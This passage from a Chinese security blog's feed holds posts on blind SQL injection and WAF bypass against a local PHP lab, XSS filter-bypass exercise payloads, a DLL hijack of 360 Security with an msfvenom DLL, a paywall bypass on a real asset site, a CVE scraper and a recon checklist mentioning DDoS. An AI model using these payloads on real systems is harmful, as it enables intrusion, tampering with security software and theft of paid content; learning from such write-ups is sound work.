alt=""></p><p>猜字段个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (2=(select count(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/Ep6rr9.png" alt=""></p><p>猜字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1)))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/EpccLj.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1))=69)v</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/19/EpcHOJ.md.png" alt=""></p><p>猜字段内容有多少个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/) from demo))</span><br></pre></td></tr></table></figure></p><p><img src="http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/" alt=""> from demo)))</p><p>猜字段内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!name*/) from demo limit 0,1),1,1))=64)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/Epgb38.png" alt=""></p><p>报错注入绕过安全狗<br>修改php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=<span class="string">"root"</span>;</span><br><span class="line">$password=<span class="string">"root"</span>;</span><br><span class="line">$host=<span class="string">"localhost:3306"</span>;</span><br><span class="line">$database=<span class="string">"test"</span>;</span><br><span class="line">$con=mysqli_connect($host,$username,$password,$database);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"Connect mysql faild...."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$sql=<span class="string">"select * from demo where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$cha=mysqli_query($con,$sql);</span><br><span class="line">$jg=mysqli_fetch_array($cha);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($jg))&#123;</span><br><span class="line">$error=mysqli_error($con);</span><br><span class="line"><span class="keyword">echo</span> $error;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">var_dump($jg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>updatexml(1,,1) #安全狗正则匹配(1,内容,1)不论里面是什么都杀,还有过滤concat(0x7e,,0x7e) 总之过滤了逗号，然后各种报错注入折腾了半天<br><img src="https://s2.ax1x.com/2019/04/19/Ep2HaR.md.png" alt=""></p><p>然后从印象笔记翻出一篇文章= =里面用的操作可真骚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1-a()</span><br></pre></td></tr></table></figure></p><p>用一个不存在的函数即可获取数据库名<br><img src="https://s2.ax1x.com/2019/04/19/EpOErR.png" alt=""></p><p>输入一个存在的列名即可获取：数据库名，表名，字段名<br>可以拿sqlmap跑字段名的字典配合burp爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 polygon(id)</span><br></pre></td></tr></table></figure></p><p>….搞不出了搞不出了。。，告辞</p><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>获取每天新的CVE</title>
      <link href="/posts/5674cd5.html"/>
      <url>/posts/5674cd5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看RSS的时候发现有篇文章说到抓取某接口获取每天新的CVE然后保存到数据库并通过邮箱告知CVE更新了。由于个人觉得不错索性就进行爬了<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>接口是<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">CVE接口</a><br><img src="https://s2.ax1x.com/2019/04/14/AOd8T1.png" alt="AOd8T1.png"></p><p>都是超链接，点进去可以看到详情，直接爬就完事了,由于最近学了异步追求速度<br>思路如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.抓取接口里url</span><br><span class="line">2.异步获取全部详情的url</span><br><span class="line">3.写入到xls</span><br></pre></td></tr></table></figure></p><p>代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/4/14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">new_cve=[]</span><br><span class="line">bh_cve=[]</span><br><span class="line">jg_cve=[]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demon</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,headers,url)</span>:</span></span><br><span class="line">        self.headers=headers</span><br><span class="line">        self.url=url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zx</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rgt=requests.get(url=self.url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">            zg=BeautifulSoup(rgt.text,<span class="string">'html.parser'</span>)</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> zg.find_all(<span class="string">'a'</span>):</span><br><span class="line">                href=c.get(<span class="string">'href'</span>)</span><br><span class="line">                new_cve.append(href)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> r:</span><br><span class="line">            print(<span class="string">'[-] Error &#123;&#125;'</span>.format(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">zhuaqu</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> reqt:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> reqt.get(url=url,headers=self.headers,timeout=<span class="number">2</span>) <span class="keyword">as</span> respone:</span><br><span class="line">                    url=respone.url</span><br><span class="line">                    jg_cve.append(url)</span><br><span class="line">                    zz=re.findall(<span class="string">'[0-9]&#123;1,&#125;-.*'</span>,str(url))</span><br><span class="line">                    bh_cve.append(<span class="string">'CVE-&#123;&#125;'</span>.format(zz[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writes</span><span class="params">(self)</span>:</span></span><br><span class="line">        workbook=xlwt.Workbook(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        sheet=workbook.add_sheet(<span class="string">"今天更新的CVE"</span>)</span><br><span class="line">        sheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">"CVE编号"</span>)</span><br><span class="line">        sheet.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">"URL"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bh_cve)):</span><br><span class="line">            sheet.write(int(i)+<span class="number">1</span>,<span class="number">0</span>,bh_cve[i])</span><br><span class="line">            sheet.write(int(i)+<span class="number">1</span>,<span class="number">1</span>,<span class="string">'&#123;&#125;'</span>.format(jg_cve[i]))</span><br><span class="line"></span><br><span class="line">        sz=time.time()</span><br><span class="line">        workbook.save(<span class="string">'&#123;&#125;.xls'</span>.format(sz))</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">'&#123;&#125;.xls'</span>.format(sz)):</span><br><span class="line">            print(<span class="string">'[+] 保存成功'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] 保存失败'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        td=[]</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> new_cve:</span><br><span class="line">            jc=asyncio.ensure_future(self.zhuaqu(n))</span><br><span class="line">            td.append(jc)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> asyncio.wait(td)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36'</span>&#125;</span><br><span class="line">    urls=<span class="string">'https://cassandra.cerias.purdue.edu/CVE_changes/today.html'</span></span><br><span class="line">    obj=Demon(headers=headers,url=urls)</span><br><span class="line">    obj.zx()</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    loop.run_until_complete(obj.main())</span><br><span class="line">    loop.close()</span><br><span class="line">    obj.writes()</span><br></pre></td></tr></table></figure></p><p>最终结果：<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p><p>仓库地址：<a href="https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过一些正则来触发xss (翻译文)</title>
      <link href="/posts/1c9464a2.html"/>
      <url>/posts/1c9464a2.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天翻译一篇文章，在有限制的地方挖出潜在xss<br>Referer:<a href="https://brutelogic.com.br/blog/xss-limited-input-formats/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/xss-limited-input-formats/</a><br>收获还是可以的</p><p><img src="https://s2.ax1x.com/2019/04/14/AO95CQ.png" alt=""></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>上面的文章给出的练习地址是：<a href="https://brutelogic.com.br/tests/input-formats.php?email=user@domain.com" target="_blank" rel="noopener">https://brutelogic.com.br/tests/input-formats.php?email=user@domain.com</a><br>可以从页面上看到，这个xss练习平台有4题<br><img src="https://s2.ax1x.com/2019/04/13/ALvfqU.md.png" alt=""></p><p><b>第一题</b><br>引用email参数输出，尝试以常规的方式插入xss payload<br><img src="https://s2.ax1x.com/2019/04/13/ALxksf.md.png" alt=""></p><p>发现并没有成功，查看文章后注意文章提到的<br><img src="https://s2.ax1x.com/2019/04/13/ALx6Te.md.png" alt=""></p><p>查看php官网查看该函数</p><blockquote><p>filter_input — 通过名称获取特定的外部变量，并且可以通过过滤器处理它</p></blockquote><p>使用过滤器里的email来过滤，由于此函数里面的email过滤是通过RFC822协议来验证是否为邮箱的<br>只要你payload满足这个协议即可成功触发xss<br>RFC822:<a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate" target="_blank" rel="noopener">http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate</a></p><p><img src="https://s2.ax1x.com/2019/04/13/ALxLfs.png" alt=""></p><p>尝试将payload插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@x.y</span><br></pre></td></tr></table></figure></p><p>由于filter_input()函数会过滤掉空格，所以payload的时候要避免空格<br><img src="https://s2.ax1x.com/2019/04/13/ALzZX6.md.png" alt=""></p><p>通过这个题可以得到一个检测方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果是用filter_input()函数来判断是否为email的话，输入 &quot;&lt;&quot;@x.y filter_input()函数会认为这是个邮箱</span><br><span class="line">使用preg_match()进行正则匹配的话,输入&quot;&lt;&quot;@x.y 认为不是个邮箱</span><br><span class="line">一般实际中遇见邮箱填写的地方可以试试</span><br></pre></td></tr></table></figure></p><p><b>第二题</b><br>这题会根据你输入的url来生成url (a标签)，猜测使用filter_input()或正则来匹配 (因为匹配url的正则能被绕过)<br>正则是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-zA-z]+://[^\s]*</span><br></pre></td></tr></table></figure></p><p>测试javascript://alert(1) 可以看到正则成功匹配出了<br><img src="https://s2.ax1x.com/2019/04/13/AOSe8s.png" alt=""></p><p>插入payload尝试，发现不行<br><img src="https://s2.ax1x.com/2019/04/13/AOSYG9.png" alt=""></p><p>根据文章说到<br><img src="https://s2.ax1x.com/2019/04/13/AOSNx1.md.png" alt=""></p><p>不明白为什么要将%0AURL编码两次？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过查询可以知道js里面的%<span class="number">0</span>A是换行符，将%<span class="number">0</span>A URL编码两次，浏览器默认解码一次，那么%<span class="number">0</span>A就会存在</span><br><span class="line">最后payload会变成这样</span><br><span class="line"></span><br><span class="line">javascript:<span class="comment">//</span></span><br><span class="line">alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/13/AOpZdO.md.png" alt=""></p><p><b>第三题</b><br>这题根据测试，发现判断条件有些改变</p><p>使用上一题的payload发现并不行= =，后面继续阅读文章和自己实现<br>发现判断的url是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://google.com/search?q=Brute%252BXSS 正则认为这才是url = =</span><br></pre></td></tr></table></figure></p><p>那么根据分析得到的payload是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="comment">//https://google.com/search?q=Brute%252BXSS%250Aalert(1)</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/13/AO9itg.md.png" alt=""></p><p><b>第四题</b><br>通过测试发现正则是判断长度的，长度如果不达到32将不显出<br><img src="https://s2.ax1x.com/2019/04/13/AO9GcR.png" alt=""></p><p>最后得出payload是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12345678901</span>&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/14/AO95CQ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dll劫持破坏360</title>
      <link href="/posts/c938687f.html"/>
      <url>/posts/c938687f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上研究某宏执行命令，然后想到能不能把这个该死的360给搞了。后面吃完饭发现，没法子想了一下看看能不能硬核绕60。没想到居然成了<br><img src="http://i0.hdslb.com/bfs/archive/2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg" alt="2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>实验环境：windows7<br>360版本：360安全卫士11</p><p>首先生成一个dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; lbw.dll</span><br></pre></td></tr></table></figure></p><p>我们使用Procmon来观察360缺少的dll</p><p>Procmon配置规则如下<br><img src="https://s2.ax1x.com/2019/04/07/AhpWjA.png" alt="AhpWjA.png"></p><p>启动360safe.exe<br><img src="https://s2.ax1x.com/2019/04/07/Ah9SEV.md.png" alt="Ah9SEV.md.png"></p><p>其实大部分软件都有这个，后面我去问Yansu老哥，回答是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">360是用vc写的，然后360没有自带这个dll</span><br></pre></td></tr></table></figure></p><p>也就是说缺少这个dll都可以利用这个操作来搞事情。好像有道理<br>之前百度云也缺少这个，试了一下也可以，没想到360也缺少这个鬼东西<br>修改msf生成的dll名为api-ms-win-core-synch-l1-2-0，扔进C:\Windows文件夹里<br>重新执行360<br><img src="https://s2.ax1x.com/2019/04/07/Ah9nUK.gif" alt="Ah9nUK.gif"></p><p>发现360执行之后会弹出calc，然后启动不成功了？？？fuck<br>尝试执行命令然后添加一个用户<br><img src="https://s2.ax1x.com/2019/04/07/AhC3JU.gif" alt="AhC3JU.gif"></p><p>你们在360运行的时候添加这个dll会怎么样呢？？<br><img src="https://s2.ax1x.com/2019/04/07/AhCYQJ.gif" alt="AhCYQJ.gif"></p><p>经过测试360有50%几率会正常运行，有50%的几率会崩溃。但是加速球不会挂掉<br>你点一下360就会触发dll了（崩溃也会触发dll）</p><p>当遇见类似于以下情况的时候可以试试：<br>拿到了管理员权限或system权限但是有360等等xxx<br><a href="http://www.91ri.org/13805.html" target="_blank" rel="noopener">思路分享：安全狗+360全套添加账户时一些小技巧_91Ri.org</a></p><p><b>我在想可不可以组合攻击？？</b></p><p>由于时间关系我先去上学，告辞</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>将UAC提升到最高</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑绕过某站下载网页素材</title>
      <link href="/posts/8eec787.html"/>
      <url>/posts/8eec787.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近开了个坑，想用django写个项目..然后发现那个前端，那个前端啊。真是恶意极强，真的是佛了后面找到某素材站。还要钱下载，我。。。祝你清明节快乐<br><img src="https://img3.hackhome.com/img2018/4/24/16/543838169.jpg" alt="543838169.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>素材站：<a href="http://www.17sucai.com" target="_blank" rel="noopener">jQuery网页特效最全网页模板和网站模板jQuery代码_17素材网</a><br>一开始想去挖他看看有没有逻辑充值，然后发现后端做了效验<br><img src="https://s2.ax1x.com/2019/04/06/AWHAMD.png" alt="AWHAMD.png"></p><p><img src="https://s2.ax1x.com/2019/04/06/AWHHwd.md.png" alt="AWHHwd.md.png"></p><p>提交表单之后发现还是50块。。。emmm，然后就想着下载能不能搞搞<br>发现也是后端判断的。。我草</p><p>回归到素材那页，发现除了下载还有个演示功能（！= =）<br><img src="https://s2.ax1x.com/2019/04/06/AWO1ts.png" alt="AWO1ts.png"></p><p>打开一看，源码一查iframe嵌套进去的。。。直接打开这个html下载完事…<br><img src="https://s2.ax1x.com/2019/04/06/AWO2nO.md.png" alt="AWO2nO.md.png"></p><p>访问，然后下载保存就完事了..<br><img src="https://s2.ax1x.com/2019/04/06/AWO4Nd.md.png" alt="AWO4Nd.md.png"></p><p>随便说一下:我现在一般把笔记全部放在<a href="https://github.com/422926799/note" target="_blank" rel="noopener">https://github.com/422926799/note</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Talking about SRC information collection</title>
      <link href="/posts/dfd6492e.html"/>
      <url>/posts/dfd6492e.html</url>
      <content type="html"><![CDATA[<p><b>0x00前言</b><br>src想挖的好，信息收集不可少。信息收集弄的好的，src都榜上有名了…<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20190301/308a70a437844de69d26bf05b6aae583.jpeg" alt=""><br>（图与本文无关）</p><p><b>0x001正文</b><br>1.先从补天哪里看到你要挖的厂商信息，可以得到这么几个信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.厂商名称</span><br><span class="line">2.厂商的漏洞收集范围</span><br><span class="line">3.厂商提供的一些东东</span><br></pre></td></tr></table></figure></p><p>2.whois查询这个厂商<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">国内的whois查询:http://whois.chinaz.com</span><br><span class="line">国外的whois查询:https://who.is</span><br><span class="line">可以得到的信息：</span><br><span class="line">  邮箱</span><br><span class="line">  电话</span><br><span class="line">  联系人</span><br><span class="line">  域名注册商</span><br><span class="line">接着whois反查这个站点的主持人邮箱和公司名称</span><br><span class="line">可以得到的信息：</span><br><span class="line">  部分子域名</span><br></pre></td></tr></table></figure></p><p>3.天眼查这个厂商<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以获取到兄弟域名的信息</span><br></pre></td></tr></table></figure></p><p>4.子域名挖掘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先进行在线查询</span><br><span class="line">推荐在线查询的站点:https://phpinfo.me/domain/</span><br><span class="line">然后在用国外的dns接口进行查询:https://dns.bufferover.run/dns?q=你的域名</span><br><span class="line">百度域名查询的接口:http://ce.baidu.com/index/getRelatedSites?site_address=你的域名</span><br><span class="line"></span><br><span class="line">使用subDomainsBrute工具进行查询</span><br><span class="line">仓库地址:https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">可以得到的信息：</span><br><span class="line">  一大批子域名</span><br></pre></td></tr></table></figure></p><p>5.判断是否有CDN<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">如果没有CDN就可以对厂商给的域名进行C段扫描和旁站查询</span><br><span class="line">因为一些大厂直接买了一个C段的</span><br><span class="line">推荐工具:whatweb</span><br><span class="line">可以得到的信息：</span><br><span class="line">  C段的站点</span><br><span class="line">  同IP站点</span><br><span class="line"></span><br><span class="line">有CDN则进行真实IP获取，有那么几个操作</span><br><span class="line">  1.查询DNS解析记录</span><br><span class="line">  2.站长超级ping（关注IP出现次数最多的IP绑定hosts文件访问）</span><br><span class="line">  3.钟馗之眼等引擎进行搜索，查询真实IP</span><br><span class="line">  4.DNS渊源</span><br><span class="line">  5.DDOS打回原形</span><br></pre></td></tr></table></figure></p><p>6.是否有WAF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一些直自己有SRC平台的厂商或安全做的很好厂商都有安装WAF</span><br><span class="line">对部分站点进行WAF判断，如果部分有的话那么绝大多数都有安WAF。当然也有单个安WAF的</span><br><span class="line">可获得的信息：</span><br><span class="line">  站点是否安装了WAF</span><br></pre></td></tr></table></figure></p><p>7.端口扫描和系统判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对弄出来的子域名进行整理，获取IP然后用nmap扫描80,443,8080或指定端口</span><br><span class="line">可获得的信息：</span><br><span class="line">  开放的端口</span><br><span class="line">  系统类型</span><br></pre></td></tr></table></figure></p><p>8.判断存活的站点和获取HTTP响应头的Server头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有些子域名是死掉的或者过期域名等其他类因数，要对其进行排除</span><br><span class="line">可获得的信息：</span><br><span class="line">  还存活的域名</span><br><span class="line">  web的容器服务</span><br></pre></td></tr></table></figure></p><p>9.反查IDC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用IP反查IDC</span><br><span class="line">推荐站点:https://myip.ms</span><br><span class="line">相同站点查询</span><br><span class="line">可获得信息</span><br><span class="line">  服务器的IDC</span><br><span class="line">  同类的站点</span><br></pre></td></tr></table></figure></p><p>10.信息整理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得了这么多信息当然要对他们进行整理，创建两个xls文件</span><br><span class="line">一个放查询到的信息，另一个放查询到的子域名</span><br></pre></td></tr></table></figure></p><p>要说的就那么多，欢迎各位大佬补充~</p><p>看过的文章：<br><a href="https://www.chainnews.com/articles/307380516533.htm" target="_blank" 